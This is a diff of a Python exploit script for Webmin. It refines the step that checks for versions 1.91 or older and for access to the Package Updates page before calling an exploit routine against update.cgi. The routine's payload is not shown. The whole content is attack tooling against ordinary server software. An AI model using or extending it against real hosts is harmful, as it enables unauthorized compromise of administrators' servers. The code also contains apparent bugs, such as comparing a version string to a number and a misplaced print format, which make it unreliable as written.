@@ -43,18 +43,20 @@ def execute(sid,rhost,rport):
 
         if version != "":
             print("Version is Webmin %s") % (version)
+
+            if version <= 1.91:
+                url = "https://%s:%s/package-updates/" % (rhost, rport)
+                r = requests.get(url, cookies=cookies, verify=False)
+
+                if re.search("Software Package Updates", r.text):
+                    print("Target is VULNERBALE! and user has permissions to >>Package Update<<<")
+                    exploit(rhost,rport,cookies,sid)
+                else:
+                    print("Target NOT vulnerable.  Try with another user.")
         else:
             print("Couldn't find version.  I'll continue, but might fail...")
 
-    if version <= 1.91:
-        url = "https://%s:%s/package-updates/" % (rhost, rport)
-        r = requests.get(url, cookies=cookies, verify=False)
-
-        if re.search("Software Package Updates", r.text):
-            print("Target is VULNERBALE! and user has permissions to >>Package Update<<<")
-            exploit(rhost,rport,cookies,sid)
-        else:
-            print("Target NOT vulnerable.  Try with another user.")
+    
 
 def exploit(rhost,rport,cookies,sid):
     url = "https://%s:%s/package-updates/update.cgi" % (rhost, rport)
